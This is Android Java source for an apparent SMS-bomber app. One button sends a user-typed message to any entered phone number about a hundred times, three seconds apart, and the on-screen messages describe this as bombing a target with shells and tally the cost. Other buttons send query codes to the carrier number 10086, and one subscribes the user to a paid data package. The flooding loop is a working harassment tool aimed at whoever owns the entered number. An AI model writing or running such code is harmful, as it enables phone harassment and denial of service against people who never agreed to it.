package cory.sending;

import android.app.*;
import android.os.*;
import android.widget.*;
import android.widget.TextView.*;
import android.view.*;
import android.telephony.gsm.*;

public class MainActivity extends Activity 
{

	int itimes = 100;

	// Send messages iSN times.
	protected int sending(String strPN, String strInfo, int iSN)
	{
		for (int i=0;i <= iSN;i++)
		{
			SmsManager send = SmsManager.getDefault();
			send.sendTextMessage(strPN, null, strInfo, null, null);
			itimes--;
			int icourt=100 - itimes;
			Toast.makeText(MainActivity.this, "ᕦ(ò_óˇ)ᕤ   已命中目标 " + icourt + "次\n炮弹剩余 " + itimes + "枚" + "\n已耗费 " + icourt * 0.1 + "元", Toast.LENGTH_SHORT).show();


			try
			{
				Thread.currentThread().sleep(3000);
			}
			catch (InterruptedException e)
			{
				return 0;
			}

		}

		return 0;
	}

	// 发送短信的函数
	void s(String strPN, String strInfo)
	{
		SmsManager send = SmsManager.getDefault();
		send.sendTextMessage(strPN, null, strInfo, null, null);
	}



    @Override
    protected void onCreate(Bundle savedInstanceState)
    {
		super.onCreate(savedInstanceState);	// 创建一个实例
		requestWindowFeature(Window.FEATURE_NO_TITLE);
        super.onCreate(savedInstanceState);
        setContentView(R.layout.main);

		// 声明控件
		final EditText ePhoneNumber, eInformation;
		Button bSending;

		// 绑定控件
		ePhoneNumber = (EditText)findViewById(R.id.ID_PHONENUMBER);
		eInformation = (EditText)findViewById(R.id.ID_INFORMATION);
		bSending = (Button)findViewById(R.id.ID_SENDING);


		// ID_SENDING 按下触发
		bSending.setOnClickListener(new OnClickListener()	
			{

				@Override
				public void onClick(View p1)
				{
					// TODO: Implement this method

					String strPN, strInfo;
					strPN =  ePhoneNumber.getText().toString();
					strInfo = eInformation.getText().toString();

					Toast.makeText(MainActivity.this, "ᕦ(ò_óˇ)ᕤ   开始轰炸！！！炮弹：100枚", Toast.LENGTH_SHORT).show();

					// 最后一个参数是短信的发送次数，反正不要钱，就一直发吧！
					sending(strPN, strInfo, 100);


				}	// End of "onClick".
			}
		);		// End of Listener

	}

	String strHost="10086";

	// 简单定义一下快捷功能
	public void balances(View v)
	{
		s(strHost, "101");	// 上面有定义
		Toast.makeText(MainActivity.this, "^_~  OK", Toast.LENGTH_SHORT).show();
		
	}
	public void cxll(View v)
	{
		s(strHost, "CXLL");
		Toast.makeText(MainActivity.this, "^_~  OK", Toast.LENGTH_SHORT).show();
	}
	public void cxtc(View v)
	{
		s(strHost, "CXTC");
		Toast.makeText(MainActivity.this, "^_~  OK", Toast.LENGTH_SHORT).show();
	}
	public void data(View v)
	{
		s(strHost, "KKC1");
		Toast.makeText(MainActivity.this, "^_~  我已经帮你办理了一元1G流量啦，很快就可以用咯", Toast.LENGTH_SHORT).show();
	}



}
